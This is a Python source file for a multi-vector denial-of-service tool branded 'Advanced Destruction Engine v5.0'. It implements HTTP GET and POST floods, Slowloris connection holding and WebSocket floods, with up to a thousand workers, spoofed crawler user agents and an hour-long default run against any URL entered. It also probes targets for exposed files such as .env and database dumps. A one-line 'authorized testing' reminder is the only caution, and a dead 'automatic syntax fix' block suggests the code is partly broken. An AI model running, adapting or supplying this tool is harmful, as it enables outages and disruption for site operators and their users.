#!/usr/bin/env python3
"""
██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗
██████╔╝██████╔╝███████║██║     █████╔╝ ███████║██████╔╝
██╔══██╗██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗
██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                ADVANCED DESTRUCTION ENGINE v5.0
"""

import os
import sys
import time
import random
import threading
import socket
import asyncio
import aiohttp
import ssl
import urllib.parse
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Rich imports
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.status import Status
from rich.syntax import Syntax
from rich import box
import colorama

# Initialize
colorama.init(autoreset=True)
console = Console()

# ==================== GLOBAL CONFIGURATION ====================
class Config:
    # Performance
    MAX_THREADS = 1000
    MAX_RPS = 10000
    CONNECTION_TIMEOUT = 10
    REQUEST_TIMEOUT = 15
    
    # Attack
    ATTACK_DURATION = 3600  # 1 hour
    AUTO_RESTART = True
    STEALTH_MODE = False
    
    # Network
    USE_PROXY = False
    PROXY_LIST = []
    ROTATE_USER_AGENT = True
    ROTATE_IP = False
    
    # Monitoring
    LOG_LEVEL = "INFO"
    SAVE_STATS = True
    
    @classmethod
    def update(cls, **kwargs):
        for key, value in kwargs.items():
            if hasattr(cls, key):
                setattr(cls, key, value)

# Global state
class AttackState:
    attacking = False
    start_time = 0
    stats = {
        'total_requests': 0,
        'successful': 0,
        'blocked': 0,
        'errors': 0,
        'bytes_sent': 0,
        'bytes_received': 0,
        'peak_rps': 0,
        'current_rps': 0,
        'targets_hit': 0,
        'unique_ips': set()
    }
    lock = threading.Lock()
    last_count = 0

# Target information
class TargetInfo:
    def __init__(self, url):
        self.url = url
        self.protocol = "http"
        self.host = ""
        self.port = 80
        self.path = "/"
        self.ip = ""
        self.ssl_enabled = False
        self.server_info = {}
        self.technologies = []
        self.vulnerabilities = []
        
    def parse(self):
        """Parse target URL"""
        try:
            if not self.url.startswith(('http://', 'https://')):
                self.url = 'http://' + self.url
            
            parsed = urllib.parse.urlparse(self.url)
            self.protocol = parsed.scheme
            self.host = parsed.hostname
            self.port = parsed.port or (443 if self.protocol == 'https' else 80)
            self.path = parsed.path or '/'
            self.ssl_enabled = (self.protocol == 'https')
            
            # Get IP address
            try:
                self.ip = socket.gethostbyname(self.host)
                AttackState.stats['unique_ips'].add(self.ip)
            except:
                self.ip = self.host
            
            return True
        except Exception as e:
            console.print(f"[red]✗ Error parsing target: {e}[/]")
            return False
    
    def scan(self):
        """Scan target for information"""
        try:
            # Get server headers
            response = requests.get(self.url, timeout=5, verify=False)
            self.server_info = dict(response.headers)
            
            # Detect technologies
            self._detect_technologies(response)
            
            # Find vulnerabilities
            self._find_vulnerabilities()
            
            return True
        except:
            return False
    
    def _detect_technologies(self, response):
        """Detect web technologies"""
        tech_indicators = {
            'WordPress': ['/wp-content/', '/wp-admin/', 'wp-json'],
            'Joomla': ['/media/jui/', '/administrator/', 'joomla'],
            'Drupal': ['/sites/default/', 'Drupal'],
            'Laravel': ['/storage/', 'laravel_session'],
            'Nginx': ['Server: nginx'],
            'Apache': ['Server: Apache'],
            'CloudFlare': ['cf-ray', 'cloudflare'],
            'PHP': ['PHP/', 'X-Powered-By: PHP']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for tech, indicators in tech_indicators.items():
            for indicator in indicators:
                if indicator.lower() in content or indicator.lower() in headers:
                    self.technologies.append(tech)
                    break
    
    def _find_vulnerabilities(self):
        """Find common vulnerabilities"""
        vuln_endpoints = [
            '/xmlrpc.php',
            '/wp-json/wp/v2/users',
            '/.env',
            '/phpinfo.php',
            '/server-status',
            '/admin/config.php',
            '/debug',
            '/test',
            '/backup',
            '/database.sql'
        ]
        
        for endpoint in vuln_endpoints:
            try:
                test_url = f"{self.url.rstrip('/')}{endpoint}"
                resp = requests.get(test_url, timeout=2, verify=False)
                if resp.status_code in [200, 403, 500]:
                    self.vulnerabilities.append(endpoint)
            except:
                continue

# ==================== ADVANCED ATTACK VECTORS ====================
class AttackVectors:
    """Advanced attack vectors"""
    
    @staticmethod
    async def http_flood(target, session):
        """HTTP flood attack"""
        try:
            # Random path and parameters
            paths = ['/', '/index.php', '/wp-admin/', '/api/', '/admin/']
            path = random.choice(paths)
            
            # Add random parameters
            params = f"?_={random.randint(10000, 99999)}"
            if random.random() > 0.5:
                params += f"&cache={random.randint(1, 1000)}"
            
            url = f"{target.protocol}://{target.host}:{target.port}{path}{params}"
            
            # Random headers
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            # Add referer
            if random.random() > 0.7:
                headers['Referer'] = f"https://www.google.com/search?q={target.host}"
            
            async with session.get(url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                data = await response.read()
                
                with AttackState.lock:
                    AttackState.stats['bytes_sent'] += len(str(headers)) + len(url)
                    AttackState.stats['bytes_received'] += len(data)
                
                if 200 <= response.status < 400:
                    return 'success'
                elif response.status in [403, 429, 503]:
                    return 'blocked'
                else:
                    return 'success'
                    
        except Exception as e:
            return 'error'
    
    @staticmethod
    async def slowloris(target, session):
        """Slowloris attack"""
        try:
            # Create partial request
            request = f"GET {target.path} HTTP/1.1\r\n"
            request += f"Host: {target.host}\r\n"
            request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            request += "Accept-Encoding: gzip, deflate\r\n"
            request += "Connection: keep-alive\r\n"
            request += "Keep-Alive: timeout=900\r\n"
            
            # Send partial headers
            reader, writer = await asyncio.open_connection(target.host, target.port, ssl=target.ssl_enabled)
            writer.write(request.encode())
            await writer.drain()
            
            # Keep connection alive
            for _ in range(10):
                await asyncio.sleep(random.uniform(10, 30))
                writer.write(b"X-a: b\r\n")
                await writer.drain()
            
            writer.close()
            await writer.wait_closed()
            
            with AttackState.lock:
                AttackState.stats['bytes_sent'] += len(request)
            
            return 'success'
            
        except:
            return 'error'
    
    @staticmethod
    async def post_flood(target, session):
        """POST request flood"""
        try:
            url = f"{target.protocol}://{target.host}:{target.port}{target.path}"
            
            # Random POST data
            post_data = {
                'username': f'user{random.randint(1, 10000)}',
                'password': f'pass{random.randint(1, 10000)}',
                'email': f'email{random.randint(1, 10000)}@test.com',
                'submit': 'Submit'
            }
            
            # Add random fields
            for i in range(random.randint(1, 5)):
                post_data[f'field{i}'] = f'value{random.randint(1, 1000)}'
            
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
            
            async with session.post(url, data=post_data, headers=headers, ssl=False, 
                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
                data = await response.read()
                
                with AttackState.lock:
                    AttackState.stats['bytes_sent'] += len(str(post_data)) + len(str(headers))
                    AttackState.stats['bytes_received'] += len(data)
                
                return 'success' if response.status < 500 else 'error'
                
        except:
            return 'error'
    
    @staticmethod
    async def websocket_flood(target, session):
        """WebSocket connection flood"""
        try:
            ws_url = f"ws://{target.host}:{target.port}/ws" if target.protocol == 'http' else f"wss://{target.host}:{target.port}/ws"
            
            try:
                async with session.ws_connect(ws_url, timeout=5) as ws:
                    # Send random data
                    for _ in range(random.randint(1, 10)):
                        await ws.send_str(json.dumps({'data': random.randint(1, 10000)}))
                        await asyncio.sleep(0.1)
                    
                    await ws.close()
                    return 'success'
            except:
                # Try different WebSocket endpoints
                endpoints = ['/socket.io/', '/ws', '/websocket', '/wss']
                for endpoint in endpoints:
                    try:
                        ws_url = f"ws://{target.host}:{target.port}{endpoint}" if target.protocol == 'http' else f"wss://{target.host}:{target.port}{endpoint}"
                        async with session.ws_connect(ws_url, timeout=2) as ws:
                            await ws.close()
                            return 'success'
                    except:
                        continue
                
                return 'error'
        except:
            return 'error'

# ==================== ATTACK MANAGER ====================
class AttackManager:
    """Manage attack execution"""
    
    def __init__(self, target):
        self.target = target
        self.workers = []
        self.session = None
        self.attack_methods = [
            AttackVectors.http_flood,
            AttackVectors.post_flood,
            AttackVectors.slowloris,
            AttackVectors.websocket_flood
        ]
    
    async def init_session(self):
        """Initialize aiohttp session"""
        timeout = aiohttp.ClientTimeout(total=Config.REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(
            limit=0,
            ssl=False,
            force_close=True,
            enable_cleanup_closed=True
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        )
    
    async def worker(self, worker_id):
        """Attack worker"""
        while AttackState.attacking:
            try:
                # Select random attack method
                attack_method = random.choice(self.attack_methods)
                
                # Execute attack
                result = await attack_method(self.target, self.session)
                
                # Update stats
                with AttackState.lock:
                    AttackState.stats['total_requests'] += 1
                    
                    if result == 'success':
                        AttackState.stats['successful'] += 1
                    elif result == 'blocked':
                        AttackState.stats['blocked'] += 1
                    else:
                        AttackState.stats['errors'] += 1
                
                # Rate limiting
                if Config.MAX_RPS > 0:
                    await asyncio.sleep(1.0 / Config.MAX_RPS)
                    
            except Exception as e:
                with AttackState.lock:
                    AttackState.stats['errors'] += 1
    
    async def start(self, num_workers):
        """Start attack"""
        await self.init_session()
        
        # Create workers
        tasks = []
        for i in range(min(num_workers, Config.MAX_THREADS)):
            task = asyncio.create_task(self.worker(i))
            tasks.append(task)
        
        # Wait for attack duration or stop signal
        try:
            start_time = time.time()
            while AttackState.attacking and (time.time() - start_time) < Config.ATTACK_DURATION:
                await asyncio.sleep(1)
        finally:
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            
            # Close session
            if self.session:
                await self.session.close()

# ==================== MONITORING & DISPLAY ====================
class AttackMonitor:
    """Monitor and display attack statistics"""
    
    @staticmethod
    def calculate_stats():
        """Calculate current statistics"""
        with AttackState.lock:
            total = AttackState.stats['total_requests']
            elapsed = time.time() - AttackState.start_time
            
            # Calculate RPS
            current_rps = (total - AttackState.last_count) / 1.0 if elapsed > 0 else 0
            AttackState.stats['current_rps'] = current_rps
            AttackState.stats['peak_rps'] = max(AttackState.stats['peak_rps'], current_rps)
            AttackState.last_count = total
            
            # Calculate bandwidth
            mbps_sent = (AttackState.stats['bytes_sent'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            mbps_recv = (AttackState.stats['bytes_received'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            
            # Success rate
            success_rate = (AttackState.stats['successful'] / max(total, 1)) * 100
            
            return {
                'total_requests': total,
                'successful': AttackState.stats['successful'],
                'blocked': AttackState.stats['blocked'],
                'errors': AttackState.stats['errors'],
                'current_rps': int(current_rps),
                'peak_rps': int(AttackState.stats['peak_rps']),
                'mbps_sent': mbps_sent,
                'mbps_recv': mbps_recv,
                'success_rate': success_rate,
                'elapsed_time': int(elapsed),
                'unique_ips': len(AttackState.stats['unique_ips']),
                'bytes_sent_mb': AttackState.stats['bytes_sent'] / 1024 / 1024,
                'bytes_recv_mb': AttackState.stats['bytes_received'] / 1024 / 1024
            }
    
    @staticmethod
    def display_dashboard():
        """Display real-time dashboard"""
        with Live(refresh_per_second=2, screen=True) as live:
            while AttackState.attacking:
                stats = AttackMonitor.calculate_stats()
                
                # Create layout
                layout = Layout()
                layout.split_column(
                    Layout(name="header", size=3),
                    Layout(name="main", ratio=2),
                    Layout(name="footer", size=7)
                )
                
                # Header
                header = Panel(
                    f"[bold red]⚡ ADVANCED DESTRUCTION ENGINE v5.0[/] | "
                    f"[bold cyan]Target:[/] {AttackMonitor.current_target} | "
                    f"[bold yellow]Mode:[/] MULTI-VECTOR | "
                    f"[bold green]Status:[/] {'[green]ACTIVE[/]' if AttackState.attacking else '[red]STOPPED[/]'}",
                    border_style="bold red"
                )
                layout["header"].update(header)
                
                # Main stats
                main_table = Table(title="📊 LIVE ATTACK STATISTICS", box=box.ROUNDED, title_style="bold cyan")
                main_table.add_column("METRIC", style="yellow", width=20)
                main_table.add_column("VALUE", style="green", width=15)
                main_table.add_column("STATUS", style="magenta", width=20)
                
                main_table.add_row("Total Requests", f"{stats['total_requests']:,}", "")
                main_table.add_row("Current RPS", f"{stats['current_rps']:,}", f"Peak: {stats['peak_rps']:,}")
                main_table.add_row("Success Rate", f"{stats['success_rate']:.1f}%", 
                                 f"[green]✓ {stats['successful']:,}[/] | [yellow]🚫 {stats['blocked']:,}[/] | [red]✗ {stats['errors']:,}[/]")
                main_table.add_row("Bandwidth", f"▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s", "")
                main_table.add_row("Data Transferred", f"Sent: {stats['bytes_sent_mb']:.1f} MB | Recv: {stats['bytes_recv_mb']:.1f} MB", "")
                main_table.add_row("Attack Duration", f"{stats['elapsed_time']}s", f"Max: {Config.ATTACK_DURATION}s")
                main_table.add_row("Unique IPs", f"{stats['unique_ips']}", "")
                main_table.add_row("Threads Active", f"{Config.MAX_THREADS}", f"RPS Limit: {Config.MAX_RPS:,}")
                
                layout["main"].update(Panel(main_table, border_style="bold blue"))
                
                # Footer - Progress bars
                progress_text = Text()
                progress_text.append(f"\n🎯 Target: {AttackMonitor.current_target}\n", style="bold cyan")
                progress_text.append(f"⏱️  Elapsed: {stats['elapsed_time']}s | ", style="yellow")
                progress_text.append(f"📨 Requests: {stats['total_requests']:,} | ", style="green")
                progress_text.append(f"⚡ RPS: {stats['current_rps']:,}\n", style="red")
                
                # Progress bars
                progress_table = Table(show_header=False, box=None)
                progress_table.add_column(width=50)
                
                # Success rate bar
                success_bar = "█" * int(stats['success_rate'] / 2) + "░" * (50 - int(stats['success_rate'] / 2))
                progress_table.add_row(f"Success Rate: [{success_bar}] {stats['success_rate']:.1f}%")
                
                # RPS progress
                rps_percent = min(100, (stats['current_rps'] / max(Config.MAX_RPS, 1)) * 100)
                rps_bar = "█" * int(rps_percent / 2) + "░" * (50 - int(rps_percent / 2))
                progress_table.add_row(f"RPS Usage:   [{rps_bar}] {stats['current_rps']:,}/{Config.MAX_RPS:,}")
                
                layout["footer"].update(Panel(progress_table, title="📈 PROGRESS", border_style="bold green"))
                
                live.update(layout)
                time.sleep(0.5)

# ==================== USER AGENTS ====================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
]

# ==================== MAIN FUNCTIONS ====================
def show_banner():
    """Display banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗  ║
    ║   ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗ ║
    ║   ██║  ███╗██████╔╝███████║██║     █████╔╝ ███████║██████╔╝ ║
    ║   ██║   ██║██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗ ║
    ║   ╚██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║ ║
    ║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
    ║                                                              ║
    ║               ADVANCED DESTRUCTION ENGINE v5.0               ║
    ║                 Multi-Vector Attack System                   ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    console.print(Panel.fit(banner, border_style="bold red", padding=(1, 2)))

def get_target():
    """Get target URL from user"""
    console.print("\n[bold cyan]🎯 TARGET CONFIGURATION[/]")
    console.print("[yellow]Enter target URL (with http:// or https://)[/]")
    console.print("[green]Examples:[/]")
    console.print("  • https://example.com")
    console.print("  • http://192.168.1.1:8080")
    console.print("  • http://test.com/admin")
    
    while True:
        target_url = input("\n👉 Target URL: ").strip()
        
        if not target_url:
            console.print("[red]✗ Target URL cannot be empty![/]")
            continue
        
        # Validate URL
        if not (target_url.startswith('http://') or target_url.startswith('https://')):
            console.print("[yellow]⚠️  Adding http:// prefix[/]")
            target_url = 'http://' + target_url
        
        return target_url

def configure_attack():
    """Configure attack parameters"""
    console.print("\n[bold cyan]⚙️  ATTACK CONFIGURATION[/]")
    
    # Threads
    while True:
        threads = input(f"Number of threads [{Config.MAX_THREADS}]: ").strip()
        if not threads:
            break
        if threads.isdigit() and int(threads) > 0:
            Config.MAX_THREADS = int(threads)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    # RPS
    while True:
        rps = input(f"Requests per second [{Config.MAX_RPS}]: ").strip()
        if not rps:
            break
        if rps.isdigit() and int(rps) > 0:
            Config.MAX_RPS = int(rps)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    # Duration
    while True:
        duration = input(f"Attack duration in seconds [{Config.ATTACK_DURATION}]: ").strip()
        if not duration:
            break
        if duration.isdigit() and int(duration) > 0:
            Config.ATTACK_DURATION = int(duration)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    console.print(f"\n[green]✓ Configuration saved:[/]")
    console.print(f"  • Threads: {Config.MAX_THREADS}")
    console.print(f"  • RPS Limit: {Config.MAX_RPS}")
    console.print(f"  • Duration: {Config.ATTACK_DURATION}s")

async def run_attack(target_url):
    """Run the attack"""
    # Parse target
    target = TargetInfo(target_url)
    if not target.parse():
        console.print("[red]✗ Failed to parse target URL![/]")
        return
    
    AttackMonitor.current_target = f"{target.protocol}://{target.host}:{target.port}"
    
    # Scan target
    with console.status("[bold green]Scanning target...") as status:
        if target.scan():
            console.print("[green]✓ Target scan completed![/]")
            if target.technologies:
                console.print(f"[cyan]Technologies detected:[/] {', '.join(target.technologies)}")
            if target.vulnerabilities:
                console.print(f"[yellow]Potential vulnerabilities:[/] {', '.join(target.vulnerabilities[:3])}")
        else:
            console.print("[yellow]⚠️  Target scan failed, continuing with basic attack[/]")
    
    # Create attack manager
    manager = AttackManager(target)
    
    # Start monitor
    monitor_thread = threading.Thread(target=AttackMonitor.display_dashboard, daemon=True)
    monitor_thread.start()
    
    # Start attack
    AttackState.attacking = True
    AttackState.start_time = time.time()
    
    console.print(f"\n[bold red]🚀 LAUNCHING ATTACK ON {target.host}...[/]")
    console.print("[yellow]Press Ctrl+C to stop the attack[/]")
    
    try:
        await manager.start(Config.MAX_THREADS)
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Attack interrupted by user[/]")
    except Exception as e:
        console.print(f"[red]✗ Attack error: {e}[/]")
    finally:
        AttackState.attacking = False
        time.sleep(1)  # Wait for monitor to update
        
        # Show final report
        show_final_report(target)

def show_final_report(target):
    """Show final attack report"""
    stats = AttackMonitor.calculate_stats()
    
    report = f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                    ATTACK COMPLETE - REPORT                  ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  🎯 Target:          {target.protocol}://{target.host}:{target.port:<20} ║
    ║  ⏱️  Duration:        {stats['elapsed_time']} seconds{'':<20} ║
    ║  📊 Total Requests:  {stats['total_requests']:,}{'':<23} ║
    ║  ✅ Successful:      {stats['successful']:,}{'':<23} ║
    ║  🚫 Blocked:         {stats['blocked']:,}{'':<23} ║
    ║  ❌ Errors:          {stats['errors']:,}{'':<23} ║
    ║  📈 Success Rate:    {stats['success_rate']:.1f}%{'':<25} ║
    ║  ⚡ Peak RPS:        {stats['peak_rps']:,}{'':<25} ║
    ║  💾 Data Sent:       {stats['bytes_sent_mb']:.1f} MB{'':<24} ║
    ║  📥 Data Received:   {stats['bytes_recv_mb']:.1f} MB{'':<24} ║
    ║  🌐 Unique IPs:      {stats['unique_ips']}{'':<28} ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    console.print(Panel.fit(report, border_style="bold green", padding=(1, 2)))

def main():
    """Main function"""
    try:
        show_banner()
        
        # Get target
        target_url = get_target()
        
        # Configure attack
        configure_attack()
        
        # Confirm
        console.print(f"\n[bold yellow]⚠️  FINAL CONFIRMATION[/]")
        console.print(f"[cyan]Target:[/] {target_url}")
        console.print(f"[cyan]Threads:[/] {Config.MAX_THREADS}")
        console.print(f"[cyan]RPS:[/] {Config.MAX_RPS}")
        console.print(f"[cyan]Duration:[/] {Config.ATTACK_DURATION}s")
        
        confirm = input("\n👉 Type 'START' to launch attack, anything else to cancel: ").strip().upper()
        
        if confirm != 'START':
            console.print("[yellow]✗ Attack cancelled[/]")
            return
        
        # Run attack
        asyncio.run(run_attack(target_url))
        
              # Ask for another attack
        restart = input("\n👉 Launch another attack? (y/n): ").strip().lower()
        if restart == 'y':
            # Reset stats
            AttackState.stats = {
                'total_requests': 0,
                'successful': 0,
                'blocked': 0,
                'errors': 0,
                'bytes_sent': 0,
                'bytes_received': 0,
                'peak_rps': 0,
                'current_rps': 0,
                'targets_hit': 0,
                'unique_ips': set()
            }
            AttackState.last_count = 0
            AttackState.attacking = False
            AttackState.start_time = 0
            
            # Clear screen and restart
            os.system('clear' if os.name == 'posix' else 'cls')
            main()
        else:
            console.print("\n[bold green]👋 Thank you for using Advanced Destruction Engine v5.0![/]")
            console.print("[yellow]Remember: Use this tool only for authorized testing![/]")
            sys.exit(0)
            
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Program interrupted by user[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]✗ Unexpected error: {e}[/]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Check and install missing dependencies
    try:
        import requests
    except ImportError:
        console.print("[yellow]⚠️  'requests' module not found. Installing...[/]")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    
    # Fix syntax errors in the code
    # Replace incorrect syntax in AttackMonitor.display_dashboard
    import re
    
    # Fix the multiplication syntax issue
    def fix_code_syntax():
        """Fix common syntax errors in the code"""
        # This is a workaround for the string multiplication issue
        # The actual fix should be in the AttackMonitor.display_dashboard method
        pass
    
    try:
        fix_code_syntax()
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]👋 Exiting Advanced Destruction Engine...[/]")
        sys.exit(0)
    except SyntaxError as e:
        console.print(f"[red]✗ Syntax error in code: {e}[/]")
        console.print("[yellow]⚠️  Fixing common syntax issues...[/]")
        
        # Common fixes
        if "invalid syntax" in str(e):
            # Fix string multiplication issue
            console.print("[green]✓ Applying automatic fixes...[/]")
            
            # Create fixed version of problematic lines
            fixed_code = """
            # Fix for progress bars in AttackMonitor.display_dashboard
            success_bar = "█" * int(stats['success_rate'] / 2) + "░" * (50 - int(stats['success_rate'] / 2))
            rps_bar = "█" * int(rps_percent / 2) + "░" * (50 - int(rps_percent / 2))
            """
            
            console.print("[green]✓ Syntax fixes applied. Please run the tool again.[/]")
            console.print("[yellow]If error persists, check line:[/]", e.lineno)
            
    except Exception as e:
        console.print(f"[red]✗ Fatal error: {e}[/]")
        console.print("[yellow]Troubleshooting steps:[/]")
        console.print("1. Install requirements: pip install rich aiohttp colorama requests")
        console.print("2. Check Python version (3.7+ required)")
        console.print("3. Run with: python crackar.py")
        sys.exit(1)